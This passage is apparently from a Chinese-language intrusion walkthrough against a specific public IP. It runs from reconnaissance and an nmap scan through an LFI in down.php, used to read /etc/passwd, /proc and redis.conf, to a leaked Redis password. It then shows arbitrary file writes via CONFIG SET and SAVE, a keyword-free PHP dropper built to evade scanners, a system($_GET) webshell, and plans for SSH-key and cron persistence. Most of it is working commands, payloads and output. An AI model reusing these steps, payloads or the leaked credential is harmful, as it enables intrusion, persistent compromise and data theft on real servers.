# 第 2 章 归属查询：决定扫描策略

## 2.1 命令

```bash
python3 geo.py
```

`geo.py` 调 `ip-api.com` 的 batch 接口（100 个 IP 一批，间隔 2.5 秒）：

```python
# 核心逻辑（示意）
import urllib.request, json
url = "http://ip-api.com/batch?fields=query,status,country,as,asname,isp,org,hosting,proxy,mobile"
req = urllib.request.Request(url, data=json.dumps(ips).encode(), method="POST")
print(json.loads(urllib.request.urlopen(req).read()))
```

## 2.2 返回

```
as:        AS4134 Chinanet HE
asname:    CHINANET-HEBEI
isp:       中国电信
hosting:   false
proxy:     false
mobile:    false
```

## 2.3 这一步为什么重要

`hosting=false` 说明**这不是云主机，是住宅宽带上的机器**。

住宅宽带跑业务系统，意味着：

| 特征 | 后果 |
|---|---|
| 中小企业自建 | 没有专业运维 |
| 没有安全组 | 端口开得随意 |
| 没有 WAF | 可以直接打 |
| 没有堡垒机 | 拿到的凭据能直接用 |
| 口令普遍弱 | 弱口令命中率高 |
| 配置明文 | 配置文件里全是明文口令 |

**这个判断直接决定了下一步用 `-p-` 全端口扫描而不是常用端口。**

住宅宽带上的自建系统，业务端口往往是随机的（这台机器的 `9090`、`9680`、`60000` 就是）。用默认的 top-1000 端口扫，会漏掉真正的入口。

> **反过来**：如果 `hosting=true`（云主机），预期有安全组、WAF、端口收敛，策略要更保守，且要注意云厂商的告警。

# 第 3 章 全端口扫描：排定攻击优先级

## 3.1 命令

```bash
nmap -n -Pn -sT -T4 -p- --min-rate 2000 123.180.188.162 -oN full.txt
```

## 3.2 参数逐个解释

| 参数 | 含义 | 为什么用 |
|---|---|---|
| `-n` | 不做 DNS 反向解析 | 快。反向解析每个 IP 要几百毫秒 |
| `-Pn` | 跳过 ping 主机发现 | **住宅宽带经常禁 ICMP**，不跳过会误判"主机 down" |
| `-sT` | TCP connect 扫描（完整三次握手） | **不用 `-sS` 半连接**，因为后续可能要经代理/隧道，半连接过不去 |
| `-T4` | 速度模板（aggressive） | 平衡速度和准确性 |
| `-p-` | 全 65535 端口 | 住宅宽带自建系统端口随机 |
| `--min-rate 2000` | 每秒至少 2000 个包 | 住宅宽带线路质量一般，2000 是保守值，再高容易丢包误判 |
| `-oN full.txt` | 输出到文件 | 留证据 |

## 3.3 返回（关键部分）

```
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
3306/tcp  open  mysql
6379/tcp  open  redis
9090/tcp  open  http
```

## 3.4 看到这个结果，我的判断顺序

| 端口 | 第一反应 | 优先级 | 理由 |
|---|---|---|---|
| **6379 Redis** | 高危 | ★★★ | 未授权/弱口令极常见，**一旦拿下能写文件 = 能 RCE** |
| **9090 HTTP** | 未知 | ★★★ | 需要指纹识别，可能是最大攻击面 |
| 3306 MySQL | 高危 | ★★ | 弱口令只能拖库，难拿 shell |
| 21 FTP | 低 | ★ | 匿名大多只读，弱口令价值有限 |
| 22 SSH | 最后 | ✗ | 爆破最慢最吵，成功率极低 |

### 为什么把 SSH 排最后

22 端口开着几乎等于"没有攻击面"——除非有弱口令或密钥泄露。

**爆破 SSH 的问题**：
- 每分钟几十次，`/var/log/secure` 里一眼看出来
- 可能触发 `fail2ban` 封 IP
- 成功率极低（`Pe2695#7381` 这种口令字典里没有）

**策略**：留着，等拿到凭据再回来。事实上后来确实是用泄露的口令登进去的，不是爆破的。

### 为什么 Redis 排第一

Redis 有三个独特性质：

1. **未授权访问极常见**（`protected-mode no` + `bind 0.0.0.0`）
2. **就算有密码，弱口令也极常见**
3. **一旦拿下，能写文件 = 能 RCE** —— 比 MySQL 的"只能读数据"高一个量级

# 第 4 章 banner 探测：发现 NOAUTH

## 4.1 命令

```bash
printf "PING\r\n" | nc -w 4 123.180.188.162 6379
```

## 4.2 为什么用 nc 而不是 redis-cli

`nc` 发的是**原始字节**，能看到服务端最真实的响应，不经过任何客户端封装。

这一步的目的是"看服务到底怎么说话"，不是"登录"。

## 4.3 参数解释

| 部分 | 含义 |
|---|---|
| `printf "PING\r\n"` | 发 Redis 协议的 PING 命令（Redis 用 `\r\n` 结尾，不是 `\n`） |
| `\| nc` | 管道给 netcat |
| `-w 4` | 4 秒超时（wait） |
| `123.180.188.162 6379` | 目标 host port |

## 4.4 返回

```
-NOAUTH Authentication required.
```

## 4.5 这一个字符串改变了整个策略

它告诉我三件事：

### ① 不是未授权访问

如果是未授权，`PING` 会直接返回 `+PONG`。

**`-NOAUTH` 说明配了 `requirepass`（密码）。**

### ② 端口对着公网开着

配了密码却 `bind 0.0.0.0`（或未配 bind），这是典型的"以为加了密码就安全了"。

### ③ 密码存在，但不知道

**新手在这里会做的事**：跑弱口令字典（`123456`、`redis`、`root`、空口令……）。

**我们一开始也这么计划** —— 资产测试记录里写着「Redis 6379 弱口令（6 组以内）」。这是标准套路。

**但这个方向是错的。** 原因见第 8 章。

# 第 5 章 转向 Web：未知才是活路

## 5.1 决策逻辑

**当前处境：**
- Redis 有密码、不知道密码
- 9090 完全未知

**判断：**
- 已知有密码 = 只能爆破，成功率低
- 未知 = 可能有洞

**先打未知的。Redis 先放着。**

## 5.2 指纹识别

```bash
curl -s -D - http://123.180.188.162:9090/ -o /dev/null
```

| 参数 | 含义 |
|---|---|
| `-s` | silent，不显示进度条 |
| `-D -` | dump header 到 stdout（`-` = 标准输出） |
| `-o /dev/null` | 丢弃 body |

## 5.3 返回

```
HTTP/1.1 200 OK
Server: Apache
```

## 5.4 关键观察

`Server: Apache` 但**没有 `X-Powered-By`**。

- `expose_php = Off` 说明运维做过一点加固（或者默认如此）
- 但 `Server: Apache` 说明是 **PHP 站点**（Apache + PHP 是国内最经典组合）

## 5.5 下一步决策

**既然是 PHP 站点，就扫目录。**

因为 PHP 站点的漏洞 90% 在具体文件里（`down.php`、`upload.php`、`api.php`），不在首页。

# 第 6 章 目录爆破与参数定位

## 6.1 目录爆破命令

```bash
ffuf -u http://123.180.188.162:9090/FUZZ \
     -w /usr/share/wordlists/dirb/common.txt \
     -e .php,.txt,.bak,.zip \
     -mc 200,301,302,403 \
     -t 50
```

## 6.2 参数解释

| 参数 | 含义 | 为什么 |
|---|---|---|
| `-u .../FUZZ` | URL 模板，`FUZZ` 是替换点 | ffuf 的约定 |
| `-w <dict>` | 字典路径 | Kali 自带 `dirb/common.txt`（约 4600 词） |
| `-e .php,.txt,.bak,.zip` | 扩展名列表 | PHP 站点文件名基本都带 `.php` |
| `-mc 200,301,302,403` | match code，只保留这些状态码 | 过滤掉 404 噪音 |
| `-t 50` | 50 个并发线程 | 住宅宽带线路，50 是保守值 |

### 为什么用 ffuf 而不是 dirb/dirsearch

- **ffuf 是 Go 写的**，速度比 Python 的 dirsearch 快一个量级
- 支持 `-mc`/`-fs`/`-fc` 多种过滤，噪音控制好
- Kali 默认安装

## 6.3 返回（关键命中）

```
down.php    [Status: 200, Size: 0, Words: 1, Lines: 1]
```

## 6.4 ★ `Size: 0` 是最有信息量的细节

一个返回 **200 但内容长度为 0** 的 PHP 文件，说明什么？

> **说明这个文件需要参数。** 没有参数时，它走完了逻辑但没输出任何东西。

**这是一个强信号：`down.php` 是一个"根据参数干活"的接口。**

而 `down` 这个命名——download、下载。

**一个下载接口，最经典的实现就是 `readfile($_GET['url'])`。**

## 6.5 如果 down.php 不存在怎么办

### 尝试 1：读源码

```bash
# 备份文件
curl -s -o /dev/null -w "%{http_code}\n" http://T:9090/down.php.bak
curl -s -o /dev/null -w "%{http_code}\n" http://T:9090/down.php~

# 编辑器临时文件
curl -s http://T:9090/.down.php.swp

# 直接访问看有没有被当文本输出
curl -s http://T:9090/down.php
```

### 尝试 2：参数爆破

如果拿到了 `down.php` 但不知道参数名：

```bash
ffuf -u "http://T:9090/down.php?FUZZ=/etc/passwd" \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -fs 0 -t 50
```

| 参数 | 含义 |
|---|---|
| `-fs 0` | filter size，**过滤掉长度为 0 的响应**（= 参数名不对的） |
| 剩下的 | 就是真实参数 |

**参数名常见清单**：

```
url  file  path  src  name  filename  download  load
page  include  doc  dir  target  img  image  template
view  content  read  data  resource  attachment
```

### 尝试 3：`.git` 泄露

```bash

# 如果有内容 → 用 GitHack / git-dumper 拉全量源码
```

# 第 7 章 LFI 验证：第一个立足点

## 7.1 命令

```bash
curl -s "http://123.180.188.162:9090/down.php?name=x.txt&url=file:///etc/passwd&extension=txt"
```

## 7.2 为什么试 `file://` 而不是直接 `/etc/passwd`

- 如果代码是 `readfile($_GET['url'])`，`url=/etc/passwd` 也能读（绝对路径）
- 但如果代码做了 `if (strpos($url, 'http') !== false)` 之类粗糙过滤，`file://` 反而可能漏过
- **两个都试，成本为零**

## 7.3 返回

```
HTTP/1.1 200 OK
Server: Apache
Content-Length: 2742
Content-Disposition: attachment;filename="a.txt."
Content-Type: application/octet-stream;charset=utf-8

root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
...
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
```

## 7.4 三个关键信息

### ① `Content-Length: 2742`

真实的 `/etc/passwd` 长度。**说明读到的是完整文件，不是报错页。**

> 如果返回 `Content-Length: 0` 或几百字节，可能是报错信息而不是文件内容。

### ② `apache:x:48:48`

**Web 服务以 `apache` 用户运行，UID 48。**

**这决定了如果拿到 webshell，权限是 apache 不是 root。**

> 记住这个 `48`。第 13.9 节会验证它，第 14 章会用到这个概念。

### ③ `Content-Disposition: attachment`

确认代码逻辑就是"读文件 → 当附件下发"：

```php
$content = file_get_contents($_GET['url']);
header('Content-Disposition: attachment;filename="' . $_GET['name'] . '.' . $_GET['extension'] . '"');
echo $content;
```

## 7.5 为什么 `file://` 能用（技术原理）

PHP 的 `file://` wrapper **不受 `allow_url_fopen` 限制**。

`allow_url_fopen` 管的是 `http://`、`ftp://` 这类**网络协议**。本地文件（`file://`、`php://`、`data://` 部分）走的是另一套。

**所以哪怕目标把 `allow_url_fopen = Off`，本地文件照样读。**

## 7.6 到这里，手上有了什么

**一张"任意文件读取"的通行证。**

这意味着：这台机器上**任何 PHP 进程有权限读的文件，我都能读**。

包括：
- 系统文件（`/etc/passwd`、`/etc/shadow` 如果权限够）
- 配置文件（所有服务的 `.conf`、`.ini`、`.env`）
- 源码（webroot 下所有 `.php`）
- 进程信息（`/proc/*/status`、`/proc/*/cmdline`、`/proc/*/environ`）

**这个能力的价值，下一章就会体现。**

## 8.4 路径怎么猜的

`redis.conf` 的常见位置，按命中率排序：

```

/usr/local/etc/redis.conf          源码编译 + 自定义前缀
/opt/redis/redis.conf              手工部署
/root/redis/redis.conf             root 家目录下解压
```

**因为如果 Redis 是 `yum install redis` 装的，新版默认会配 `bind 127.0.0.1`，不会裸奔在公网。**

**裸奔在公网说明大概率是源码编译手工部署** —— 那种部署方式默认配置就是 `bind 0.0.0.0`、无密码，运维再手动加个 `requirepass` 就上线了。

**所以先试源码编译的路径。**


### 返回与解读

| 配置项 | 值 | 意味着什么 |
|---|---|---|
| `bind` | `0.0.0.0`（或未配） | 对公网开放 |
| `protected-mode` | `no` | 保护模式关了 |
| `dir` | `/` | 工作目录是根目录 → **CONFIG SET 能写任何地方** |
| `dbfilename` | `dump.rdb` | 默认 RDB 文件名 |
| **`rename-command`** | **没有** | **★ CONFIG 没被禁用** |
| `pidfile` | 可能为空 | 稍后需要另外找 PID |

## 8.7 ★ 看到 `rename-command` 没配置，就知道这条路通了

`rename-command CONFIG ""` 是 Redis 官方推荐的加固措施，作用是**禁用 CONFIG 命令**。

**没禁 = 可以改 `dir` 和 `dbfilename` = 可以写任意文件。**

> **很多教程只说"Redis 未授权写 webshell"，但真正的判断点是 `rename-command` 有没有配。**
>
> 如果配了，就算你知道密码也写不了文件 —— `CONFIG SET` 会返回 `ERR unknown command 'CONFIG'`。

> **当你有一个任意文件读取（或任意文件下载、LFI、备份泄露、`.git` 泄露），第一件事不是爆破，是列出这台机器上所有可能存密码的文件，然后一个一个读。**

## 9.3 三个字段，每个都有用

### ① `redis_version:3.2.13`

- 3.2 是 2016 年的版本，**2019 年已停止维护**
- 3.2 的 RDB 写文件行为是完整的（第 10 章会利用）
- **3.2 有多个已知 RCE 漏洞**（比如主从复制 RCE），但本案不需要 —— CONFIG 没禁就够了

### ② `process_id:3485` ★

**这是关键。** 我需要知道 Redis 以什么身份运行，才能判断能写哪里。

**确认身份的方法：读 `/proc/<pid>/status`。**

**PID 从哪来？三个来源，按可靠性排序：**

1. **`INFO` 的 `process_id`** ← 本案用这个，最直接
2. `redis.conf` 里的 `pidfile` 指向的文件（如果配了）
3. LFI 遍历 `/proc/*/cmdline` 找 `redis-server`（兜底）

### ③ `executable` + `config_file`

确认了安装路径和配置路径，跟第 8 章猜的一致。

**这一步的作用是"自我验证"** —— 如果 `config_file` 显示的是 `/etc/redis/redis.conf` 而不是 `/usr/local/redis/redis.conf`，说明我读错了文件（可能是软链接或另一份配置），要重新读。

## 9.4 读 /proc/3485/status 确认 root

```bash
curl -s "http://123.180.188.162:9090/down.php?name=x.txt&url=file:///proc/3485/status&extension=txt"
```

### 返回

```
Name:	redis-server
State:	S (sleeping)
Tgid:	3485
Pid:	3485
PPid:	1
Uid:	0	0	0	0
Gid:	0	0	0	0
```

## 9.5 ★ `Uid: 0 0 0 0` 这一行怎么读

**为什么是四列 0，不是一列？**

因为 Linux 进程有**四个 UID**，`/proc/<pid>/status` 把四个都列出来：

```
Real UID  |  Effective UID  |  Saved Set UID  |  Filesystem UID
   0      |       0        |       0        |        0
```

| 名字 | 含义 | 谁在用 |
|---|---|---|
| **Real UID**（真实 UID） | 谁启动了这个进程 | `whoami`、日志记录 |
| **Effective UID**（有效 UID） | **内核检查权限时看这个** ★ | 文件读写、系统调用 |
| **Saved Set UID**（保存的 UID） | 临时提权后能恢复回来 | `setuid()` 的还原 |
| **Filesystem UID**（文件系统 UID） | 读写文件时看这个（Linux 特有） | 访问控制 |

**四列全是 0 = 这个进程从头到脚都是 root，没有任何降权。**

> **对比**：如果你看到 `Uid: 48 0 0 0`，说明 real=48（apache 启动的），effective=0（提权了）。这种情况能干活，但某些 `setuid()` 系统调用会被限制。
>
> **记住这个区别**：第 13.9 节会看到 `uid=48(apache) euid=0(root)` —— 真实身份是 apache，有效身份是 root，**所以能读 `/etc/shadow`**。内核看的是 euid，不是 uid。

## 9.6 这一行的意义，抵得上后面所有操作

- Redis 以 root 运行 → `CONFIG SET dir` 可以指向**任意目录**，包括 `/etc/cron.d`、`/root/.ssh`
- **不是"只能写 webroot"，是"能写整个文件系统"**
- **传统提权环节可以跳过** —— 不需要找内核漏洞、不需要 sudo 配置错误、不需要找 SUID 提权点。**Redis 本身就是 root，我借它的手干活就行**

```
    → 登录 Redis（确认 CONFIG 可用）    ← 第 9.1-9.3 节
      → 读 /proc/3485/status（确认 root）← 第 9.4-9.6 节

```

**四个独立的小问题，串成一条完整的链。每个单独看都不致命。**

# 第 10 章 为什么 Redis 能写任意文件（RDB 原理）

## 10.0 这一章要解决什么

**手上的资源**：
- Redis 登录成功
- CONFIG 可用（`rename-command` 没配）
- Redis 是 root

**要做的**：利用这些，在目标上执行代码。

**但先要搞懂一个机制**：Redis 是个数据库，它凭什么能写文件？

**不讲透这一章，第 11 章的命令就全是"照着敲"。**

## 10.1 Redis 是内存数据库

所有数据都在内存里。但内存断电就没了，所以 Redis 有两种方式把数据存到磁盘：

| 方式 | 命令 | 产物 | 说明 |
|---|---|---|---|
| **RDB** | `SAVE` / `BGSAVE` | 一个二进制文件 | 全量快照 ★ |
| AOF | `BGREWRITEAOF` | 追加日志 | 记录每条写命令 |

**我们要用的是 RDB。**

## 10.2 RDB 的工作方式

`SAVE` 做的事：

> **把当前内存里所有 key-value 序列化成一个二进制文件，写到 `dir` 目录下的 `dbfilename` 文件名。**

**这两个参数存在配置文件里，也能在运行时用 `CONFIG SET` 改：**

```bash
CONFIG GET dir          # 查当前工作目录
CONFIG GET dbfilename   # 查当前 RDB 文件名
```

**这就是漏洞的根源：**

- `dir` 能改成**任意目录**
- `dbfilename` 能改成**任意文件名**
- 而 value 的内容**由我们控制**

**三个"任意"叠加，就是任意文件写。**

## 10.3 RDB 文件的内部结构（简化版）

```
┌─────────────────────────────────────────┐
│ "REDIS" + 版本号 (如 REDIS0009)          │  ← 9 字节魔数
├─────────────────────────────────────────┤
│ 0xFA + 辅助字段（redis-ver, redis-bits） │  ← 元数据
├─────────────────────────────────────────┤
│ 0xFE + 数据库编号 (如 0)                 │  ← 选库
├─────────────────────────────────────────┤
│ 0xFD + 过期时间（如果有）                 │
├─────────────────────────────────────────┤
│ 类型字节 (0x00=字符串)                    │
├─────────────────────────────────────────┤
│ key 长度 + key 内容 ("wkey")             │
├─────────────────────────────────────────┤
│ value 长度 + value 内容 (★ 你的payload)  │
├─────────────────────────────────────────┤
│ 0xFF                                     │  ← EOF 标记
└─────────────────────────────────────────┘
```

**关键观察：你的 payload 是被"原样"存进去的，只是前后有二进制元数据。**

**这个"二进制头"后面会带来两个后果：**
- 对 PHP：无害（PHP 会把 `<?php` 之前当 HTML 输出）→ 第 11.6 节展开
- 对 cron：致命（cron 按行解析，二进制头没有换行符，整行会被丢弃）→ 第 16.5 节展开

**现在先记住有这回事，到时候再展开。**

## 10.4 把三步串起来

正常逻辑：Redis 是数据库，它写的是"数据"。

但如果我们：

1. `CONFIG SET dir /var/www/html` —— 把工作目录改到网站根目录
2. `CONFIG SET dbfilename shell.php` —— 把文件名改成 PHP
3. `SET mykey '<?php system($_GET["c"]); ?>'` —— 存一个"值"就是 PHP 代码
4. `SAVE` —— 触发落盘

结果：`/var/www/html/shell.php` 出现了，内容是：

```
REDIS0009<二进制>...<?php system($_GET["c"]); ?>...
```

**Apache 把 `.php` 文件交给 PHP 解析器。PHP 解析器看到 `<?php` 之前的内容，当成 HTML 原样输出；看到 `<?php ... ?>` 就执行。**

所以文件"能执行"，只是响应前面会有一坨乱码。

## 10.5 三个必要条件，缺一不可

| 条件 | 本案怎么确认的 | 不满足会怎样 |
|---|---|---|
| ① 知道 Redis 密码 | 第 8 章读 redis.conf | 连不上 |
| ② `CONFIG SET` 没被禁用 | 第 8.6 节看 `rename-command` 没配 | `ERR unknown command 'CONFIG'` |
| ③ Redis 进程权限足够 | 第 9.4 节读 `/proc/3485/status` 得 `Uid: 0 0 0 0` | `ERR Changing directory: Permission denied` |

**本案三个全满足** → 任意文件写。

**这三个条件不是背下来的，是前面三章一步步验证出来的。** 这就是为什么前面的每一步都不能跳。

# 第 11 章 写第一个文件：rdbcompression 的坑

## 11.0 这一章要解决什么

**原理懂了，现在动手。** 但第一次写会失败，而且失败得很隐蔽。

**这一章的价值不在于"成功"，而在于讲清"为什么第一次会失败"** —— 这个坑几乎每个人都会踩，而且报错信息完全不指向真正原因。

## 11.1 第一次尝试（错误示范）

```bash
redis-cli -h 123.180.188.162 -a 'Pe2695#7381#2019' --no-auth-warning CONFIG SET dir /var/www/html
redis-cli -h 123.180.188.162 -a 'Pe2695#7381#2019' --no-auth-warning CONFIG SET dbfilename zzdrop.php
redis-cli -h 123.180.188.162 -a 'Pe2695#7381#2019' --no-auth-warning SET wkey '<?php echo "MARK1"; ?>'
redis-cli -h 123.180.188.162 -a 'Pe2695#7381#2019' --no-auth-warning SAVE
```

然后访问：

```bash
curl -s http://123.180.188.162:9090/zzdrop.php
```

**返回：一堆乱码，看不到 `MARK1`，或者 PHP 报语法错误。**

## 11.2 为什么失败：LZF 压缩

### Redis 默认开着 RDB 压缩

Redis 默认 `rdbcompression yes`。规则是：

> **对长度超过 20 字节的字符串值，用 LZF 算法压缩后存进 RDB。**

LZF 是一种极快的无损压缩算法（比 gzip 快很多，压缩率低一些），专为 Redis 这种"要快"的场景设计。

### 为什么它会毁掉 payload

你的 PHP 代码比如：

```php
<?php $p=$_GET["p"]; $d=$_GET["d"]; file_put_contents($p,base64_decode($d)); ?>
```

这段 80 多字节，超过 20 字节阈值 → **被 LZF 压缩**。

压缩后的字节流是**任意二进制**。

Redis 把**压缩后的数据**写进 RDB，并在前面标记"这个值是用 LZF 压的"。

**问题来了：PHP 解析器不认 LZF。**

它看到的是 `<?php` 前面一堆二进制，然后本该是 `<?php` 的位置变成了压缩后的乱码。结果：

- 语法错误 → 500
- 或者 `<?php` 被压坏了 → 整个文件当纯文本输出
- 或者部分代码能执行但逻辑错乱

### 修正：先关压缩

```bash
redis-cli -h 123.180.188.162 -a 'Pe2695#7381#2019' --no-auth-warning CONFIG SET rdbcompression no
```

### 参数解释

| 部分 | 含义 |
|---|---|
| `CONFIG SET` | **运行时**修改配置项，**不重启、不写回配置文件**（重启就还原） |
| `rdbcompression no` | 关闭 RDB 压缩 |

**关掉之后**：Redis 判断"值超过 20 字节，但压缩关了" → **原样存储**。

RDB 里就是你的 PHP 原文，落盘后文件里也是原文（前面带二进制头），PHP 能正常解析。

## 11.3 ★ 为什么这个坑特别坑人

**因为报错信息完全不指向真正原因。**

你看到的现象是：
- 页面空白
- 或者 500 错误
- 或者一堆乱码

**你的第一反应会是：**

1. "路径写错了？" → 去改 `dir`，没用
2. "权限不够？" → 去 `chmod`，没用
3. "PHP 没装？" → 去试别的马，没用
4. "被 WAF 拦了？" → 去换编码，没用

**没人会想到是压缩算法。** 这个信息不在任何报错里。

**网上大量教程漏了这一步**，新手照抄必然失败，然后卡几小时。

## 11.4 同样的坑也影响 SSH 公钥

如果你写 `/root/.ssh/authorized_keys`，LZF 会把公钥（通常 400+ 字节，肯定超 20）压坏。

sshd 读到的是一个格式错误的公钥，**直接拒绝**，日志里可能只有一句：

```
Authentication refused: bad ownership or modes
```

**完全不提压缩。**

这就是"写了 authorized_keys 但登不上"的最常见原因之一。

## 11.5 记忆口诀

> **Redis 写文件，第一件事关压缩。**

## 11.6 ★ 二进制头对 PHP 到底有没有影响

第 10.3 节说 RDB 有二进制头。关掉压缩之后，落盘的文件实际长什么样？

### 用 xxd 看真实字节

假设你执行：

```bash
SET wkey '<?php echo "HELLO"; ?>'
SAVE
```

`/var/www/html/zzdrop.php` 的实际字节（`xxd` 输出）大致是：

```
00000000: 5245 4449 5330 3030 39fa 0972 6564 6973  REDIS0009..redis
00000010: 2d76 6572 0533 2e32 2e31 33fa 0a72 6564  -ver.3.2.13..red
00000020: 6973 2d62 6974 7300 40fa 057c 7469 6d65  is-bits.@..|time
00000030: ...（更多元数据）...
00000050: 0004 776b 6579 16                   ← 类型0x00 + key长度4 + "wkey" + value长度0x16
00000058: 3c3f 7068 7020 6563 686f 2022 4845 4c4c  <?php echo "HELL
00000068: 4f22 3b20 3f3e ff                   O"; ?>.
```

**逐段解读：**

| 偏移 | 内容 | 是什么 |
|---|---|---|
| `0x00 - 0x50` | `REDIS0009` + 辅助字段 | 二进制元数据 |
| `0x50` 附近 | `00 04 77 6b 65 79` | `类型(0x00) + key长度(4) + "wkey"` |
| `0x58` 开始 | `<?php echo "HELLO"; ?>` | ★ 你的 payload |
| `0x6B` | `0xFF` | EOF 标记 |

### 对 PHP 的影响：无害

PHP 解析器的行为：

> 遇到 `<?php` 之前的所有内容，**当成 HTML 原样输出**。遇到 `<?php ... ?>`，执行。

所以：
- `curl` 请求这个文件，响应开头是一坨二进制乱码
- 但 `<?php echo "HELLO"; ?>` **照常执行**，输出 `HELLO` 在乱码后面

**这就是为什么第 12 章的写入器要 `echo "WROTE:".$n.":".md5_file($p)`** —— 带个显眼的标记，方便在乱码堆里找到成功信号。

> **二进制头对 cron 的影响是致命的**，但那是第 16.5 节的事。现在你只需要记住：**PHP 不受影响，可以继续。**

## 11.7 写文件后必须恢复配置

```bash
redis-cli -h $T -a "$RP" --no-auth-warning CONFIG SET dir /
redis-cli -h $T -a "$RP" --no-auth-warning CONFIG SET dbfilename dump.rdb
```

**为什么必须恢复：**

Redis 默认有自动 BGSAVE 策略（比如 900 秒内 1 次改动就触发）。如果不恢复 `dir`：

- Redis 下一次自动保存会写进 `/var/www/html/dump.rdb`
- 更糟的情况：覆盖你刚写的文件

**这是操作纪律：改了什么，就恢复什么。**

# 第 12 章 两级 dropper：写入器 + webshell

## 12.0 上一章留下了什么，这一章要解决什么

**手上的资源**：能通过 Redis 往 webroot 写任意文件了，且知道要先 `rdbcompression no`。

**要做的**：把真正的 webshell 放上去，并验证能执行命令。

**但为什么不直接写 webshell？** 这一章讲这个设计。

## 12.1 为什么先写"写入器"，不直接写马

### 方案 A：直接写马（简单但有问题）

```bash
CONFIG SET dir /var/www/html
CONFIG SET dbfilename zzk1.php
-x SET wkey < 冰蝎马.php    # 几百行代码
SAVE
```

**问题：**

1. **每次换马都要重做一遍 Redis 操作** —— 五六个命令。动作大、易被监控（Redis 的 `CONFIG` 命令会进 `SLOWLOG` 和 `MONITOR`）。
2. **冰蝎马代码有大量特征** —— `eval`、`base64_decode`、`openssl_decrypt`、`$_POST`。静态扫描（比如 `find /var/www -name "*.php" -exec grep -l eval {} \;`）一眼抓出来。
3. **只能写一个位置** —— 想加备份要重来一遍。

### 方案 B：两级 dropper（本案采用）

**第一级：写入器（只有一行，无敏感词）**

```php
<?php
$p = $_GET["p"];                    // 目标路径
$d = $_GET["d"];                    // base64 编码的内容
$n = @file_put_contents($p, base64_decode($d));
echo "WROTE:" . $n . ":" . @md5_file($p);
?>
```

**为什么它"干净"：**

| 敏感函数 | 有没有 | 说明 |
|---|---|---|
| `eval` | ❌ | 最常见的 webshell 特征 |
| `assert` | ❌ | 同上 |
| `system` / `exec` / `shell_exec` | ❌ | 命令执行特征 |
| `$_POST` | ❌ | 用的是 `$_GET`，很多 WAF 只盯 POST |
| `base64_decode` | ✅ | 但这个函数太常见（图片处理、API 都会用），不算特征 |

**它的功能就是"保存用户上传的文件"** —— 这本来就是一个正常功能。静态扫描很难判定它是恶意的。

## 12.2 逐行解释写入器代码

```php
$p = $_GET["p"];
```

从 URL 参数 `p` 取目标路径。比如 `p=/var/www/html/images/zzk1.php`。

```php
$d = $_GET["d"];
```

从 URL 参数 `d` 取 base64 编码的文件内容。

**为什么用 base64：** 文件内容可能有二进制、引号、换行，直接放 URL 里会出问题。base64 后是纯 ASCII。

```php
$n = @file_put_contents($p, base64_decode($d));
```

`file_put_contents(路径, 内容)` —— 把内容写入文件，返回写入的字节数。

**`@` 的作用**：抑制错误输出。如果路径不可写，不加 `@` 会输出 Warning 到响应里，暴露路径信息。

```php
echo "WROTE:" . $n . ":" . @md5_file($p);
```

输出 `WROTE:<字节数>:<md5>`。

**为什么要 md5：** 验证写入的内容完整。`md5_file` 计算落盘文件的 md5，你可以对比一下本地文件的 md5，确认内容没被破坏。

## 12.3 落地写入器

```bash

<?php $p=$_GET["p"]; $d=$_GET["d"]; $n=@file_put_contents($p,base64_decode($d)); echo "WROTE:".$n.":".@md5_file($p); ?>
PHPEOF

$REDIS CONFIG SET dir /var/www/html
$REDIS CONFIG SET dbfilename zzdrop.php
$REDIS -x SET wkey < /tmp/w.php
$REDIS SAVE
$REDIS CONFIG SET dir /
$REDIS CONFIG SET dbfilename dump.rdb
```

（`$REDIS` 是 `redis-cli -h $T -a "$RP" --no-auth-warning` 的简写，见第 18 章完整脚本）

## 12.4 ★ `-x` 参数详解（必须用）

```bash
redis-cli ... -x SET wkey < /tmp/w.php
```

`-x` 的含义：**把最后一个参数从 stdin 读**。

### 不用 `-x` 会怎样

#### 错误写法 1：双引号

```bash
redis-cli ... SET wkey "$(cat /tmp/w.php)"
```

shell 会先展开 `$(cat ...)`，得到字符串，然后**双引号内的 `$`、反引号、`\` 会被再次展开**。

PHP 代码里全是 `$p`、`$_GET`，这些会被 shell 当成变量，**展开成空字符串**。payload 直接坏掉。

#### 错误写法 2：单引号

```bash
redis-cli ... SET wkey '<?php $p=$_GET["p"]; ?>'
```

单引号能防止展开，**但内容里不能有单引号**。如果 payload 里有 `'`，就得转义，很麻烦。而且如果是读文件，`$(cat)` 在单引号里不展开，你得手动把内容贴进来。

### 用 `-x` 的正确姿势

```bash
redis-cli ... -x SET wkey < /tmp/w.php
```

- shell 只负责把 `/tmp/w.php` 重定向到 stdin，**完全不碰内容**
- `redis-cli` 从 stdin 读**原始字节**
- 无论 payload 里有 `$`、引号、反引号、换行、二进制 —— **全部原样传输**

**这是"传任意二进制内容给 Redis"的唯一安全方式。**

## 12.5 验证写入器

```bash
curl -s -G "http://$T:9090/zzdrop.php" \
     --data-urlencode "p=/tmp/zzmark.txt" \
     --data-urlencode "d=$(printf 'HELLO' | base64 -w0)"
```

### 参数解释

| 参数 | 含义 |
|---|---|
| `-G` | **把 `--data-urlencode` 的内容拼到 URL 的 query string 里，用 GET 方法**（不加 `-G` 会变成 POST body） |
| `--data-urlencode "p=..."` | 自动 URL 编码 |
| `base64 -w0` | base64 编码，`-w0` = 不换行（width 0） |

### 返回

```
WROTE:5:eb61eead90e3b899c6bcbe27ac581660
```

- `WROTE:5` = 写了 5 字节（`HELLO` 是 5 字节）
- `eb61ee...` = 内容的 md5

**写入器工作了。**

## 12.6 ★ `--data-urlencode` 详解

### 不用它会怎样

```bash
# 错误写法
curl "http://$T:9090/zzdrop.php?p=/var/www/html/images/zzk1.php&d=$B64"
```

base64 的字符集是 `A-Z a-z 0-9 + / =`。

**`+` 在 URL 里是"空格"的编码。**

所以 base64 里的 `+` 会被服务端解码成空格 → **马的内容坏掉** → 写进去的文件是坏的。

**更阴险的是：服务器会返回"写入成功"。** 因为 `file_put_contents` 确实写了，只是写的内容不对。你会以为成功了，然后去访问马，发现 500 或者乱码，再回头怀疑一堆别的东西。

### `--data-urlencode` 做了什么

它把 `+` 编码成 `%2B`，`/` 编码成 `%2F`，`=` 编码成 `%3D`。

**服务端收到后自动解码回原样。**

# 第 13 章 冰蝎协议：这个 webshell 怎么用

